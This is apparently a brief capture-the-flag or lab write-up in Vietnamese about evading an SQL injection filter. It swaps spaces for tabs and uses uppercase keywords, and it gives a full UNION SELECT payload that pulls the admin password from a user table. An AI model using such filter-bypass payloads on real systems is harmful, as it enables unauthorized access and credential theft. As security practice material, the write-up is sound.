![alt text](image.png)

bypass:
space -> tab %09

ở đây union, select, admin không được chuyển về dạng chữ thường nên ta có thể bypass bằng chữ in hoa.
payload: uid=a'	UNION	SELECT	1,(SELECT	upw	FROM	user	WHERE	uid='ADMIN'),1;--